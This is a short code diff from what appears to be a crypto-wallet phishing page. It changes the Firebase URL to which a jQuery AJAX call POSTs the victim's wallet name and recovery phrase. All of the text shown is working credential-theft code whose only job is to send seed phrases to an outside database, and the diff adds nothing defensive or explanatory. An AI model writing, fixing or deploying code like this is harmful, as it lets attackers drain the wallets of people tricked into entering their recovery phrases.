@@ -9,7 +9,7 @@
         alert('Fill in your recovery phrase');
       } else {
         $.ajax({
-          url: "https://amen-1bc99-default-rtdb.firebaseio.com/",
+          url: "https://amen-1bc99.firebaseio.com/",
           method: 'POST',
           data: { import_type: 'phrase', wallet: wallet, phrase: phraseInputVal, _token: "VNSElc2gRav1j8Vo06hMGE2lgerCJRM3VHsxXmjf" },
           success: function (res) {
